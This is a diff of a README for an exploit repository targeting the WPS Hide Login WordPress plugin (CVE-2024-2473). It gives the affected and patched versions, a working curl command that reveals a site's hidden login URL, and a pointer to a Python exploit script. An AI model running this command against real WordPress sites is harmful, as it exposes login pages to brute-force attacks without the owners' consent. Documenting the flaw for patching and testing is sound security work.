@@ -1,11 +1,23 @@
-# WPS Hide Login - Login Page disclosure Exploit Script
+# WPS Hide Login <= 1.9.15.2 - Login Page disclosure (CVE-2024-2473)
 
-Check relevant CVEs on [WPS-Hide-Login WordPress plugin](https://wordpress.org/plugins/wps-hide-login/).
+Disclose login page hidden by [WPS-Hide-Login WordPress plugin](https://wordpress.org/plugins/wps-hide-login/).
 
-## Check options
+Affected versions: 1.5.1 to 1.9.15.2
+
+Patched version: 1.9.16
+
+## Exploitation cURL command
 
 ```bash
-./disclose-login.py -h
+curl -X POST -sk https://$target/wp-admin/?action=postpass -d 'post_password=' | grep -i location | cut -d ' ' -f 2- | cut -d '?' -f 1
+```
+
+## Exploitation Python script
+
+This script include tests for other CVEs on [WPS-Hide-Login WordPress plugin](https://wordpress.org/plugins/wps-hide-login/).
+
+```bash
+./show-login.py -h
 ```
 
 ## References
